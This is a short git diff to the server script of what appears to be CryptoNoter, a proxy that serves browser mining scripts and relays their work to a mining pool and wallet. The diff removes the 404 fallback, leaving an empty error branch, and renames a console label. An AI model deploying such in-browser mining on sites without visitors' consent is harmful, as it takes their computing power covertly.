@@ -54,11 +54,7 @@ const ssl = !!(conf.key && conf.cert);
 const stats = (req, res) => {
     req.url = (req.url === '/') ? '/index.html' : req.url;
     fs.readFile(__dirname + '/web' + req.url, (err, buf) => {
-        if (err) {
-            fs.readFile(__dirname + '/web/404.html', (err, buf) => {
-                res.end(buf);
-            });
-        } else {
+        if (err) {} else {
             if (!req.url.match(/\.wasm$/) && !req.url.match(/\.mem$/)) {
                 buf = buf.toString().replace(/%CryptoNoter_domain%/g, conf.domain);
                 if (req.url.match(/\.js$/)) {
@@ -249,6 +245,6 @@ srv.on('connection', (ws) => {
 });
 web.listen(conf.lport, conf.lhost, () => {
     console.log(banner);
-    console.log(' Listen on : ' + conf.lhost + ':' + conf.lport + '\n Pool Host : ' + conf.pool + '\n Ur Wallet : ' + conf.addr + '\n');
+    console.log(' Listen on : ' + conf.lhost + ':' + conf.lport + '\n Pool Host : ' + conf.pool + '\n Wallet Add: ' + conf.addr + '\n');
     console.log('----------------------------------------------------------------------------------------\n');
 });
